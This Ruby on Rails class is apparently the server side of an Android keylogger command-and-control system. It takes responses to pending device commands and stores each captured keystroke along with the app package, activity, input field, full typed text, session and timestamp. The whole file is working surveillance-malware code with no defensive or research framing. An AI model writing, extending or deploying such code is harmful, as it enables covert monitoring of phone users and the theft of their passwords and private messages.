# frozen_string_literal: true

# Processes keylog data from Android devices
# Saves captured keystrokes to Keylog model with app name and timestamps
class KeylogResponseProcessor
  def initialize(pending_command, response)
    @pending_command = pending_command
    @response = response
    @smartphone = pending_command.smartphone
  end

  def process
    keylogs = @response['keylogs'] || @response['data'] || []
    
    unless keylogs.is_a?(Array)
      keylogs = [keylogs] if keylogs.is_a?(Hash)
    end

    keylogs.each do |keylog_entry|
      save_keylog(keylog_entry)
    end

    Rails.logger.info "[KeylogResponseProcessor] Saved #{keylogs.count} keylog entries for device #{@smartphone.device_id}"
    @pending_command.mark_completed(@response)
  rescue StandardError => e
    Rails.logger.error "[KeylogResponseProcessor] Error processing keylogs: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
    @pending_command.mark_failed(e.message)
  end

  private

  def save_keylog(entry)
    # Normalize entry keys
    entry = entry.symbolize_keys if entry.respond_to?(:symbolize_keys)

    # Handle various timestamp formats
    captured_at = parse_timestamp(entry[:timestamp] || entry[:client_timestamp])

    # Create keylog record
    Keylog.create!(
      smartphone_id: @smartphone.id,
      device_id: @smartphone.device_id,
      keystroke: entry[:keystroke] || entry[:key] || '',
      app_name: entry[:app_name] || entry[:app_package] || 'Unknown',
      app_package: entry[:app_package],
      activity: entry[:activity],
      event_type: entry[:event_type] || 'TEXT_CHANGED',
      field_id: entry[:field_id] || entry[:hint],
      input_type: entry[:input_type],
      full_text: entry[:full_text],
      client_timestamp: (captured_at.to_i * 1000),
      session_id: entry[:session_id],
      captured_at: captured_at
    )
  rescue StandardError => e
    Rails.logger.error "[KeylogResponseProcessor] Error saving keylog entry: #{e.message}"
  end

  def parse_timestamp(timestamp)
    return Time.current if timestamp.blank?

    begin
      # Handle millisecond timestamps (mobile devices often send these)
      if timestamp.to_i > 9999999999
        Time.at(timestamp.to_i / 1000.0)
      else
        Time.at(timestamp.to_i)
      end
    rescue StandardError => e
      Rails.logger.warn "[KeylogResponseProcessor] Failed to parse timestamp #{timestamp}: #{e.message}"
      Time.current
    end
  end
end
